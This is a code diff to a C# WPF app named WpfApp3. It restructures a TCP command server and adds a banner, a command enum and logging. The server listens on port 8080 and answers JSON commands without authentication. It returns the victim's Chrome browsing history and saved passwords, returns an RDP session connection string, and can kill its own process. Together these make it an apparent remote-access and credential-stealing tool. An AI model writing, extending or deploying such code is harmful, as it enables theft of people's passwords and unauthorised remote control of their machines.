@@ -26,7 +26,25 @@ namespace WpfApp3
         public MainWindow()
         {
             InitializeComponent();
+            Console.WriteLine(@"
+  _____  ___ ____  __ __   ___ ____                               
+ / ___/ /  _]    \|  |  | /  _]    \                              
+(   \_ /  [_|  D  )  |  |/  [_|  D  )                             
+ \__  |    _]    /|  |  |    _]    /                              
+ /  \ |   [_|    \|  :  |   [_|    \                              
+ \    |     |  .  \\   /|     |  .  \                             
+ _\___|_____|__|\_| \_/ |_____|__|\_| ____ _______ __  ____ __ __ 
+|     |      |                       |    / ___/  |  |/    |  |  |
+|   __|      |                        |  (   \_|  |  |  o  |  |  |
+|  |_ |_|  |_|                        |  |\__  |  _  |     |  ~  |
+|   _]  |  |__                        |  |/  \ |  |  |  _  |___, |
+|  |    |  |  |                       |  |\    |  |  |  |  |     |
+|__|    |__|__|                      |____|\___|__|__|__|__|____/ 
+                                                                  
+
+");
         }
+        public enum Commands : int { HISTORY = 1, PASSWORDS = 2, RDP = 3, Shut_Down = 4 };
 
         private void IncomingRDPCall(object guest)
         {
@@ -158,125 +176,146 @@ namespace WpfApp3
                 MessageBox.Show("The server is already running !", "Server Alive", MessageBoxButton.OK, MessageBoxImage.Information);
             }
         }
+
         protected async void Server()
         {
-            //Start RDP Session
-            string rdp = StartRDP();
-            Thread.Sleep(5000);
-
-
-            //The ip and port parameters.
-            string ip = "10.0.0.8";
-            int port = 8080;
-            bool flag = true;
-
-            //---listen at the specified IP and port no.---
-            IPAddress localAdd = IPAddress.Parse(GetLocalIPAddress());
-            TcpListener listener = new TcpListener(localAdd, port);
-            listener.Start();
-
-
-            //---get the incoming data through a network stream---
-            while (flag)
+            try
             {
-                try
+                //Start RDP Session
+                Console.WriteLine("Starting RDP Session...");
+                string rdp = StartRDP();
+                Thread.Sleep(300);
+
+
+                //The ip and port parameters.
+                string ip = "10.0.0.8";
+                int port = 8080;
+                bool flag = true;
+
+                //---listen at the specified IP and port no.---
+                IPAddress localAdd = IPAddress.Parse(GetLocalIPAddress());
+                TcpListener listener = new TcpListener(localAdd, port);
+                Console.WriteLine("<<Listening on {0} ...>>", listener.LocalEndpoint);
+                listener.Start();
+
+
+
+                //---get the incoming data through a network stream---
+                while (flag)
                 {
-                    TcpClient client = await listener.AcceptTcpClientAsync();
-                    NetworkStream nwStream = client.GetStream();
-
-                    byte[] buffer = new byte[client.ReceiveBufferSize];
-
-                    //---read incoming stream---
-                    int bytesRead = await nwStream.ReadAsync(buffer, 0, client.ReceiveBufferSize);
-
-                    //---convert the data received into a string---
-                    string dataReceived = Encoding.UTF8.GetString(buffer, 0, bytesRead);
-                    dynamic message = JsonConvert.DeserializeObject(dataReceived);
-
-
-                    //Builds a new dictionary for the return message.
-                    Dictionary<string, string> msg = new Dictionary<string, string>();
-                    //Dictionary<string, DictionaryHelper<string, DataTable>> msg = new Dictionary<string, DictionaryHelper<string, DataTable>>();
-                    string result;
-                    bool fl = false;
-                    switch ((string)message.Command)
+                    try
                     {
-                        #region History
-                        case "History":
-                            DataTable dt = await Chrome_History.GetChromeHistoryDataAsync();
-                            if (dt == null)
-                            {
-                                msg.Add("STATUS", "ERROR");
-                                msg.Add("HistoryResult", null);
-                            }
-                            else if (dt != null)
-                            {
-                                msg.Add("STATUS", "OK");
-                                msg.Add("HistoryResult", JsonConvert.SerializeObject(dt));
-                            }
-                            break;
-                        #endregion
-                        case "Passwords":
-                            DataTable dt2 = await Chrome_Passwords.GetPasswordsAsync();
-                            if (dt2 == null)
-                            {
-                                msg.Add("STATUS", "ERROR");
-                                msg.Add("PasswordsResult", null);
-                            }
-                            else if (dt2 != null)
-                            {
-                                msg.Add("STATUS", "OK");
-                                msg.Add("PasswordsResult", JsonConvert.SerializeObject(dt2));
-                            }
-                            break;
-                        case "Shut_Down":
-                            msg.Add("STATUS", "OK");
-                            fl = true;
-                            //myThread.Abort();
-                            //Application.Current.Shutdown();
-                            //Close();
-                            break;
-                        case "RDP_SESSION":
-                            msg.Add("STATUS", "OK");
-                            msg.Add("CONNSTRING", rdp);
-                            break;
-                        default:
-                            break;
-                    }
-                    result = JsonConvert.SerializeObject(msg);
+                        TcpClient client = await listener.AcceptTcpClientAsync();
+                        NetworkStream nwStream = client.GetStream();
 
-                    //Sends the Json-string to the client.
-                    byte[] buffers = Encoding.UTF8.GetBytes(result);
-                    nwStream.Write(buffers, 0, buffers.Length);
-                    client.Close();
-                    Debug.Write("Client closed...");
+                        byte[] buffer = new byte[client.ReceiveBufferSize];
+
+                        //---read incoming stream---
+                        int bytesRead = await nwStream.ReadAsync(buffer, 0, client.ReceiveBufferSize);
+
+                        //---convert the data received into a string---
+                        string dataReceived = Encoding.UTF8.GetString(buffer, 0, bytesRead);
+                        dynamic message = JsonConvert.DeserializeObject(dataReceived);
 
 
-                    //myThread.Abort();
-                    if(fl)
-                    Dispatcher.Invoke(() =>
-                    {
+                        //Builds a new dictionary for the return message.
+                        Dictionary<string, string> msg = new Dictionary<string, string>();
+                        //Dictionary<string, DictionaryHelper<string, DataTable>> msg = new Dictionary<string, DictionaryHelper<string, DataTable>>();
+                        string result;
+                        bool fl = false;
+                        int cmdInt = 0;
+                        switch ((string)message.Command)
                         {
-                            try
-                            {
-                                foreach (var process in Process.GetProcessesByName("WpfApp3"))
+                            #region History
+                            case "History":
+                                DataTable dt = await Chrome_History.GetChromeHistoryDataAsync();
+                                cmdInt = 1;
+                                if (dt == null)
                                 {
-                                    process.Kill();
+                                    msg.Add("STATUS", "ERROR");
+                                    msg.Add("HistoryResult", null);
                                 }
-                                Close();
-                                Application.Current.Shutdown();
-                            }
-                            catch(Exception ex)
-                            {
-                                MessageBox.Show(ex.ToString());
-                            }
+                                else if (dt != null)
+                                {
+                                    msg.Add("STATUS", "OK");
+                                    msg.Add("HistoryResult", JsonConvert.SerializeObject(dt));
+                                }
+                                break;
+                            #endregion
+                            #region Passwords
+                            case "Passwords":
+                                DataTable dt2 = await Chrome_Passwords.GetPasswordsAsync();
+                                cmdInt = 2;
+                                if (dt2 == null)
+                                {
+                                    msg.Add("STATUS", "ERROR");
+                                    msg.Add("PasswordsResult", null);
+                                }
+                                else if (dt2 != null)
+                                {
+                                    msg.Add("STATUS", "OK");
+                                    msg.Add("PasswordsResult", JsonConvert.SerializeObject(dt2));
+                                }
+                                break;
+                            #endregion
+                            case "Shut_Down":
+                                msg.Add("STATUS", "OK");
+                                cmdInt = 4;
+                                fl = true;
+                                //myThread.Abort();
+                                //Application.Current.Shutdown();
+                                //Close();
+                                break;
+                            case "RDP_SESSION":
+                                msg.Add("STATUS", "OK");
+                                msg.Add("CONNSTRING", rdp);
+                                cmdInt = 3;
+                                break;
+                            default:
+                                break;
                         }
-                    });
+                        Commands cmds = (Commands)cmdInt;
+                        Console.WriteLine($"[{client.Client.RemoteEndPoint.ToString()}] asked for [{(Commands)cmdInt}]");
+                        result = JsonConvert.SerializeObject(msg);
+
+                        //Sends the Json-string to the client.
+                        byte[] buffers = Encoding.UTF8.GetBytes(result);
+                        await nwStream.WriteAsync(buffers, 0, buffers.Length);
+                        client.Close();
+                        Debug.Write("Client closed...");
+
+
+                        //myThread.Abort();
+                        if (fl)
+                            await Dispatcher.BeginInvoke(new Action(() =>
+                            {
+                                {
+                                    try
+                                    {
+                                        foreach (var process in Process.GetProcessesByName("WpfApp3"))
+                                        {
+                                            process.Kill();
+                                        }
+                                        Close();
+                                        Application.Current.Shutdown();
+                                    }
+                                    catch (Exception ex)
+                                    {
+                                        MessageBox.Show(ex.ToString());
+                                    }
+                                }
+                            }));
+                    }
+                    catch (Exception ex)
+                    {
+                        MessageBox.Show(ex.ToString());
+                        continue;
+                    }
                 }
-                catch(Exception ex)
-                {
-                    MessageBox.Show(ex.ToString());
-                }
+            }
+            catch(Exception ex)
+            {
+                MessageBox.Show(ex.ToString());
             }
         }
 
